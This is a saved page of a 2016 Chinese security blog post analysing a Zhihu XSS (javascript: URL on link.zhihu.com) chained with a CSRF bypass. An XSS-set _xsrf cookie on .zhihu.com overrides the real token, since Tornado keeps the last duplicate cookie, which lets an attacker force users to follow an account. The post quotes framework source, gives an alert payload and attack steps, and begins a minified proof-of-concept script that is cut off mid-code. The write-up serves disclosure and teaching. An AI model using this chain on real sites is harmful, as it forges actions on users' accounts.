@@ -1,0 +1,420 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>知乎某处XSS+刷粉超详细漏洞技术分析 | 离别歌</title>
+<link href="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/styles.css" rel="stylesheet"/>
+<link href="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/style.css" rel="stylesheet"/>
+<link href="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/jquery.min.js"></script>
+<link href="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/code.css" rel="stylesheet"/>
+<link href="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/button.css" rel="stylesheet"/>
+<link href="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/HTML/zhihu-xss-worm.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/HTML/zhihu-xss-worm.html&amp;text=%E7%9F%A5%E4%B9%8E%E6%9F%90%E5%A4%84XSS%2B%E5%88%B7%E7%B2%89%E8%B6%85%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/HTML/zhihu-xss-worm.html&amp;title=%E7%9F%A5%E4%B9%8E%E6%9F%90%E5%A4%84XSS%2B%E5%88%B7%E7%B2%89%E8%B6%85%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/HTML/zhihu-xss-worm.html&amp;is_video=false&amp;description=%E7%9F%A5%E4%B9%8E%E6%9F%90%E5%A4%84XSS%2B%E5%88%B7%E7%B2%89%E8%B6%85%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=%E7%9F%A5%E4%B9%8E%E6%9F%90%E5%A4%84XSS%2B%E5%88%B7%E7%B2%89%E8%B6%85%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90&amp;body=Check out this article: https%3A//www.leavesongs.com/HTML/zhihu-xss-worm.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/HTML/zhihu-xss-worm.html&amp;title=%E7%9F%A5%E4%B9%8E%E6%9F%90%E5%A4%84XSS%2B%E5%88%B7%E7%B2%89%E8%B6%85%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/HTML/zhihu-xss-worm.html&amp;title=%E7%9F%A5%E4%B9%8E%E6%9F%90%E5%A4%84XSS%2B%E5%88%B7%E7%B2%89%E8%B6%85%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/HTML/zhihu-xss-worm.html&amp;title=%E7%9F%A5%E4%B9%8E%E6%9F%90%E5%A4%84XSS%2B%E5%88%B7%E7%B2%89%E8%B6%85%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/HTML/zhihu-xss-worm.html&amp;title=%E7%9F%A5%E4%B9%8E%E6%9F%90%E5%A4%84XSS%2B%E5%88%B7%E7%B2%89%E8%B6%85%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/HTML/zhihu-xss-worm.html&amp;name=%E7%9F%A5%E4%B9%8E%E6%9F%90%E5%A4%84XSS%2B%E5%88%B7%E7%B2%89%E8%B6%85%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">知乎某处XSS+刷粉超详细漏洞技术分析</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2016年4月17日 15:13" itemprop="datePublished">
+                    2016 四月 17 15:13
+                </time>
+</div>
+<div class="article-tag">
+            阅读：5273
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/HTML">web前端</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/%E7%9F%A5%E4%B9%8E">知乎</a>,
+                
+                <a class="tag-link" href="/tag/CSRF%E6%BC%8F%E6%B4%9E">CSRF漏洞</a>,
+                
+                <a class="tag-link" href="/tag/xss">xss</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>我觉得十分经典的一个漏洞，和大家分享一下~</p>
+<p>好久没法前端漏洞分析了，这次来一个。</p>
+<h2 id="xss"><a class="toclink" href="#xss">老问题导致的XSS漏洞</a></h2>
+<p>首先看一个XSS漏洞，这个点是老问题了， <a href="http://www.wooyun.org/bugs/wooyun-2016-0171240"><a href="http://www.wooyun.org/bugs/wooyun-2016-0171240">http://www.wooyun.org/bugs/wooyun-2016-0171240</a></a><br>
+知乎按照洞主提供的方法进行修复了，但明显是不行的。我们看到 <a href=""><a href="">https://link.zhihu.com/?target=http://www.baidu.com</a></a> 这个链接的源码：</br></p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201604/ef3d1460877348.jpg"><img alt="14566414207565.jpg" src="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/thum-ef3d1460877348.jpg"/></a></p>
+<p>将输入的信息传入URI参数，解码以后赋值与location.href。明显可以利用JavaScript:伪协议执行js代码。</p>
+<p>如下： <a href=""><a href="">https://link.zhihu.com/?target=javascript:alert(1</a>)</a></p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201604/4ab01460877349.jpg"><img alt="14566415103785.jpg" src="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/thum-4ab01460877349.jpg"/></a></p>
+<p>如何利用这个漏洞，有如下办法：</p>
+<ol>
+<li>获取用户Cookie</li>
+<li>刷粉、蠕虫等</li>
+</ol>
+<p>但经过分析，这两种利用办法都无法直接达到。首先，因为知乎重要cookie加了httponly，所以打不到用户cookie；另外，因为知乎的主站是www.zhihu.com，而xss处于子域link.zhihu.com，并非同域，无法获取www域下的CSRF Token，也就无法提交任意表单。<br>
+那么，这个漏洞岂不是上不了主页了？</br></p>
+<h2 id="csrf"><a class="toclink" href="#csrf">知乎的CSRF防御机制</a></h2>
+<p>去年7月份左右，我在TSRC的西安沙龙上对基于Token的CSRF原理与实例进行了一些讲解，但唯一一种情况没有提到：那就是同主域不同子域的情况下，怎么进行CSRF？</p>
+<p>我先来说说知乎是如何检查CSRF漏洞的。</p>
+<p>首先用户在访问知乎后，知乎会为用户设置一个随机Cookie，叫_xsrf。用户在填写表单的时候，表单里会自动插入一个隐藏的项目，也叫_xsrf。</p>
+<p>用户提交表单的时候，后端会将表单里插入的_xsrf和cookie中所带的_xsrf进行比对。如果二者相同，则说明为合法的表单。</p>
+<p>这种解决方法其实比较常见，因为在没有xss的情况下，黑客无法获取到cookie中的_xsrf，不在同一个域，也无法获取表单中的_xsrf。二者都无法获取到，所以保证了表单的安全。</p>
+<p>那么，知乎这个xss，能不能获取到_xsrf呢？</p>
+<p>我们看到www.zhihu.com的cookie：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201604/4a471460877347.png"><img alt="1.png" src="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/thum-4a471460877347.png"/></a>￼</p>
+<p>Domain=<a href="http://www.zhihu.com">www.zhihu.com</a>，没得戏，在link.zhihu.com下获取不到www的cookie。</p>
+<p>非同域这个条件，让工作很难正常进行。那么，怎么绕过呢？</p>
+<p>既然我们无法获取cookie，我们自己设置一个值，不就可以了？！</p>
+<p>这涉及到cookie的机制了。x.a.com域下，可以设置x.a.com的cookie，也可以设置.a.com的cookie。所以，我们在link.zhihu.com下利用XSS设置.zhihu.com的COOKIE。这样，在www.zhihu.com的数据包中，将会带着两个_xsrf，其中一个为已知的。</p>
+<h2 id="tornadopythoncookie"><a class="toclink" href="#tornadopythoncookie">知乎/Tornado/Python对于同名cookie的处理</a></h2>
+<p>据以往对知乎的了解，知道知乎是基于Tornado开发的，这一点从『_xsrf』这个名字上也可看出。我们可以看看Tornado中是怎么处理Cookie的：</p>
+<div class="codehilite"><pre><span></span><span class="nd">@property</span>
+<span class="k">def</span> <span class="nf">cookies</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+   <span class="sd">"""A dictionary of Cookie.Morsel objects."""</span>
+   <span class="k">if</span> <span class="ow">not</span> <span class="nb">hasattr</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="s2">"_cookies"</span><span class="p">):</span>
+       <span class="bp">self</span><span class="o">.</span><span class="n">_cookies</span> <span class="o">=</span> <span class="n">Cookie</span><span class="o">.</span><span class="n">SimpleCookie</span><span class="p">()</span>
+       <span class="k">if</span> <span class="s2">"Cookie"</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">:</span>
+           <span class="k">try</span><span class="p">:</span>
+               <span class="bp">self</span><span class="o">.</span><span class="n">_cookies</span><span class="o">.</span><span class="n">load</span><span class="p">(</span>
+                   <span class="n">native_str</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s2">"Cookie"</span><span class="p">]))</span>
+           <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+               <span class="bp">self</span><span class="o">.</span><span class="n">_cookies</span> <span class="o">=</span> <span class="p">{}</span>
+   <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_cookies</span> 
+</pre></div>
+<p>利用的是python自带的Cookie库，跟进一下Cookie.SimpleCookie类的load方法：</p>
+<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">load</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">rawdata</span><span class="p">):</span>
+   <span class="sd">"""Load cookies from a string (presumably HTTP_COOKIE) or</span>
+<span class="sd">   from a dictionary.  Loading cookies from a dictionary 'd'</span>
+<span class="sd">   is equivalent to calling:</span>
+<span class="sd">       map(Cookie.__setitem__, d.keys(), d.values())</span>
+<span class="sd">   """</span>
+   <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">rawdata</span><span class="p">)</span> <span class="o">==</span> <span class="nb">type</span><span class="p">(</span><span class="s2">""</span><span class="p">):</span>
+       <span class="bp">self</span><span class="o">.</span><span class="n">__ParseString</span><span class="p">(</span><span class="n">rawdata</span><span class="p">)</span>
+   <span class="k">else</span><span class="p">:</span>
+       <span class="c1"># self.update() wouldn't call our custom __setitem__</span>
+       <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">rawdata</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+           <span class="bp">self</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
+   <span class="k">return</span> 
+</pre></div>
+<p>跟进一下__ParseString方法：</p>
+<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">__ParseString</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="nb">str</span><span class="p">,</span> <span class="n">patt</span><span class="o">=</span><span class="n">_CookiePattern</span><span class="p">):</span>
+   <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>            <span class="c1"># Our starting point</span>
+   <span class="n">n</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>     <span class="c1"># Length of string</span>
+   <span class="n">M</span> <span class="o">=</span> <span class="bp">None</span>         <span class="c1"># current morsel</span>
+
+   <span class="k">while</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">:</span>
+       <span class="c1"># Start looking for a cookie</span>
+       <span class="n">match</span> <span class="o">=</span> <span class="n">patt</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+       <span class="k">if</span> <span class="ow">not</span> <span class="n">match</span><span class="p">:</span> <span class="k">break</span>          <span class="c1"># No more cookies</span>
+
+       <span class="n">K</span><span class="p">,</span><span class="n">V</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="s2">"key"</span><span class="p">),</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="s2">"val"</span><span class="p">)</span>
+       <span class="n">i</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">end</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+       <span class="c1"># Parse the key, value in case it's metainfo</span>
+       <span class="k">if</span> <span class="n">K</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"$"</span><span class="p">:</span>
+           <span class="c1"># We ignore attributes which pertain to the cookie</span>
+           <span class="c1"># mechanism as a whole.  See RFC 2109.</span>
+           <span class="c1"># (Does anyone care?)</span>
+           <span class="k">if</span> <span class="n">M</span><span class="p">:</span>
+               <span class="n">M</span><span class="p">[</span> <span class="n">K</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span> <span class="p">]</span> <span class="o">=</span> <span class="n">V</span>
+       <span class="k">elif</span> <span class="n">K</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">Morsel</span><span class="o">.</span><span class="n">_reserved</span><span class="p">:</span>
+           <span class="k">if</span> <span class="n">M</span><span class="p">:</span>
+               <span class="k">if</span> <span class="n">V</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+                   <span class="k">if</span> <span class="n">K</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">Morsel</span><span class="o">.</span><span class="n">_flags</span><span class="p">:</span>
+                       <span class="n">M</span><span class="p">[</span><span class="n">K</span><span class="p">]</span> <span class="o">=</span> <span class="bp">True</span>
+               <span class="k">else</span><span class="p">:</span>
+                   <span class="n">M</span><span class="p">[</span><span class="n">K</span><span class="p">]</span> <span class="o">=</span> <span class="n">_unquote</span><span class="p">(</span><span class="n">V</span><span class="p">)</span>
+       <span class="k">elif</span> <span class="n">V</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
+           <span class="n">rval</span><span class="p">,</span> <span class="n">cval</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">value_decode</span><span class="p">(</span><span class="n">V</span><span class="p">)</span>
+           <span class="bp">self</span><span class="o">.</span><span class="n">__set</span><span class="p">(</span><span class="n">K</span><span class="p">,</span> <span class="n">rval</span><span class="p">,</span> <span class="n">cval</span><span class="p">)</span>
+           <span class="n">M</span> <span class="o">=</span> <span class="bp">self</span><span class="p">[</span><span class="n">K</span><span class="p">]</span>
+</pre></div>
+<p>这个方法有个特点：解析了HEADER中的Cookie以后，一个个赋值在self中。如果存在同名Cookie的话，后者将覆盖前者。<br/>
+这也是tornado的一个特性。对比起来，我们看到php是怎么处理同名cookie的：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span> 
+<span class="k">echo</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'_xsrf'</span><span class="p">];</span> 
+</pre></div>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201604/cd5c1460877349.jpg"><img alt="14566499775996.jpg" src="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/thum-cd5c1460877349.jpg"/></a></p>
+<p>获取的是前者。这也是php的一个特性，二者的区别，我不再从源码上分析了。</p>
+<p>回到知乎的这个问题，因为知乎获取的_xsrf是后者。而恰好，我们利用XSS设置的cookie，将是所有cookie里最后一个。（当然，如果是php的话，我们也可以通过设置path，将cookie的优先级提到前面）</p>
+<p>这样，后端在检查_xsrf的时候，会从cookie中获取我们设置的token，和表单中我们提交的token相比较。这二者，我们控制其相等即可。</p>
+<h2 id="_xsrf"><a class="toclink" href="#_xsrf">覆盖_xsrf进行刷粉</a></h2>
+<p>理论讲完了，我来理一下思路：</p>
+<ol>
+<li>利用link.zhihu.com的xss，设置cookie: _xsrf=aaaaaa; domain=.zhihu.com</li>
+<li>设置表单中的_xsrf=aaaaaa;</li>
+<li>POST数据包，关注目标用户</li>
+</ol>
+<p>编写POC代码：</p>
+<div class="codehilite"><pre><span></span><span class="nx">love</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span><span class="kd">var</span> <span class="nx">c</span><span class="o">=</span><span class="p">{</span><span class="nx">version</span><span class="o">:</span><span class="p">{</span><span class="nx">name</span><span class="o">:</span><span class="s2">"Elastic Love"</span><span class="p">,</span><span class="nx">author</span><span class="o">:</span><span class="s2">"quininer"</span><span class="p">,</span><span class="nx">version</span><span class="o">:</span><span class="s2">"141229"</span><span class="p">},</span><span class="nx">conf</span><span class="o">:</span><span class="p">{</span><span class="nx">protocol</span><span class="o">:</span><span class="s2">"{{= protocol }}"</span><span class="p">,</span><span class="nx">host</span><span class="o">:</span><span class="s2">"{{= host }}"</span><span class="p">,</span><span class="nx">id</span><span class="o">:</span><span class="s2">"{{= id }}"</span><span class="p">},</span><span class="nx">run</span><span class="o">:</span><span class="p">{</span><span class="nx">jsonp</span><span class="o">:</span><span class="p">{},</span><span class="nx">args</span><span class="o">:</span><span class="p">{},</span><span class="nx">data</span><span class="o">:</span><span class="p">{},</span><span class="nx">foo</span><span class="o">:</span><span class="p">{}},</span><span class="nx">op</span><span class="o">:</span><span class="p">{</span><span class="nx">bind</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">b</span><span class="p">,</span><span class="nx">d</span><span class="p">){</span><span class="nx">a</span><span class="p">.</span><span class="nx">addEventListener</span><span class="o">?</span><span class="nx">a</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="nx">b</span><span class="p">,</span><span class="nx">d</span><span class="p">,</span><span class="o">!</span><span class="mi">1</span><span class="p">)</span><span class="o">:</span><span class="nx">a</span><span class="p">.</span><span class="nx">attachEvent</span><span class="p">(</span><span class="s2">"on"</span><span class="o">+</span><span class="nx">b</span><span class="p">,</span><span class="nx">d</span><span class="p">);</span><span class="k">return</span> <span class="nx">a</span><span class="p">},</span><span class="nx">random</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">){</span><span class="k">return</span> <span class="nx">a</span><span class="o">?</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">().</span><span class="nx">toString</span><span class="p">(</span><span class="mi">36</span><span class="p">).</span><span class="nx">slice</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">:</span><span class="mi">1</span><span class="nx">E5</span><span class="o">*</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()}}};</span><span class="nx">c</span><span class="p">.</span><span class="nx">get</span><span class="o">=</span><span class="p">{</span><span class="nx">isorigin</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">b</span><span class="p">){</span><span class="kd">var</span> <span class="nx">d</span><span class="o">=</span><span class="nx">c</span><span class="p">.</span><span class="nx">dom</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="s2">"a"</span><span class="p">,{</span><span class="nx">href</span><span class="o">:</span><span class="nx">a</span><span class="p">}),</span><span class="nx">f</span><span class="o">=</span><span class="nx">c</span><span class="p">.</span><span class="nx">dom</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="s2">"a"</span><span class="p">,{</span><span class="nx">href</span><span class="o">:</span><span class="nx">b</span><span class="o">||</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">origin</span><span class="p">});</span><span class="k">return</span> <span class="nx">d</span><span class="p">.</span><span class="nx">protocol</span><span class="o">==</span><span class="nx">f</span><span class="p">.</span><span class="nx">protocol</span><span class="o">&amp;&amp;</span><span class="nx">d</span><span class="p">.</span><span class="nx">hostname</span><span class="o">==</span><span class="nx">f</span><span class="p">.</span><span class="nx">hostname</span><span class="o">&amp;&amp;</span><span class="nx">d</span><span class="p">.</span><span class="nx">port</span><span class="o">==</span><span class="nx">f</span><span class="p">.</span><span class="nx">port</span><span class="o">?!</span><span class="mi">0</span><span class="o">:!</span><span class="mi">1</span><span class="p">},</span><span class="nx">testorigin</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">){</span><span class="k">try</span><span class="p">{</span><span class="nx">c</span><span class="p">.</span><span class="nx">req</span><span class="p">.</span><span class="nx">ajax</span><span class="p">(</span><span class="nx">a</span><span class="p">)}</span><span class="k">catch</span><span class="p">(</span><span class="nx">b</span><span class="p">){</span><span class="k">return</span> <span class="mi">19</span><span class="o">!=</span><span class="nx">b</span><span class="p">.</span><span class="nx">code</span><span class="o">?!</span><span class="mi">0</span><span class="o">:!</span><span class="mi">1</span><span class="p">}</span><span class="k">return</span><span class="o">!</span><span class="mi">0</span><span class="p">},</span><span class="nx">protocol</span><span class="o">:</span><span class="nx">c</span><span class="p">.</span><span class="nx">conf</span><span class="p">.</span><span class="nx">protocol</span><span class="o">?</span><span class="nx">c</span><span class="p">.</span><span class="nx">conf</span><span class="p">.</span><span class="nx">protocol</span><span class="o">:</span><span class="s2">"file:"</span><span class="o">==</span><span class="nx">location</span><span class="p">.</span><span class="nx">protocol</span><span class="o">?</span><span class="s2">"http:"</span><span class="o">:</span><span class="s2">""</span><span class="p">,</span><span class="nx">isdom</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">){</span><span class="k">return</span> <span class="nx">a</span><span class="p">.</span><span class="nx">nodeType</span><span class="o">?!</span><span class="mi">0</span><span class="o">:!</span><span class="mi">1</span><span class="p">},</span><span class="nx">id</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">){</span><span class="k">return</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="nx">a</span><span class="p">)},</span><span class="nx">name</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">){</span><span class="k">return</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByName</span><span class="p">(</span><span class="nx">a</span><span class="p">)},</span><span class="nx">tag</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">){</span><span class="k">return</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="nx">a</span><span class="p">)},</span><span class="kr">class</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">){</span><span class="k">return</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByClassName</span><span class="p">(</span><span class="nx">a</span><span class="p">)},</span><span class="nx">html</span><span class="o">:</span><span class="kd">function</span><span class="p">(){</span><span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">tag</span><span class="p">(</span><span class="s2">"html"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">||</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">"&lt;html&gt;"</span><span class="p">)</span><span class="o">&amp;</span><span class="k">this</span><span class="p">.</span><span class="nx">tag</span><span class="p">(</span><span class="s2">"html"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]},</span><span class="nx">head</span><span class="o">:</span><span class="kd">function</span><span class="p">(){</span><span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">tag</span><span class="p">(</span><span class="s2">"head"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">||</span><span class="nx">c</span><span class="p">.</span><span class="nx">dom</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s2">"head"</span><span class="p">,</span><span class="o">!</span><span class="mi">1</span><span class="p">,</span><span class="k">this</span><span class="p">.</span><span class="nx">html</span><span class="p">())},</span><span class="nx">body</span><span class="o">:</span><span class="kd">function</span><span class="p">(){</span><span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">tag</span><span class="p">(</span><span class="s2">"body"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">||</span><span class="nx">c</span><span class="p">.</span><span class="nx">dom</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s2">"body"</span><span class="p">,</span><span class="o">!</span><span class="mi">1</span><span class="p">,</span><span class="k">this</span><span class="p">.</span><span class="nx">html</span><span class="p">())}};</span><span class="nx">c</span><span class="p">.</span><span class="nx">dom</span><span class="o">=</span><span class="p">{</span><span class="nx">inner</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">b</span><span class="p">,</span><span class="nx">d</span><span class="p">){</span><span class="kd">var</span> <span class="nx">f</span><span class="o">=</span><span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">slice</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">arguments</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span><span class="nx">d</span><span class="o">=</span><span class="nx">d</span><span class="o">&amp;&amp;</span><span class="nx">c</span><span class="p">.</span><span class="nx">get</span><span class="p">.</span><span class="nx">isdom</span><span class="p">(</span><span class="nx">d</span><span class="p">)</span><span class="o">?</span><span class="nx">d</span><span class="o">:</span><span class="nx">c</span><span class="p">.</span><span class="nx">get</span><span class="p">.</span><span class="nx">body</span><span class="p">();</span><span class="kd">var</span> <span class="nx">e</span><span 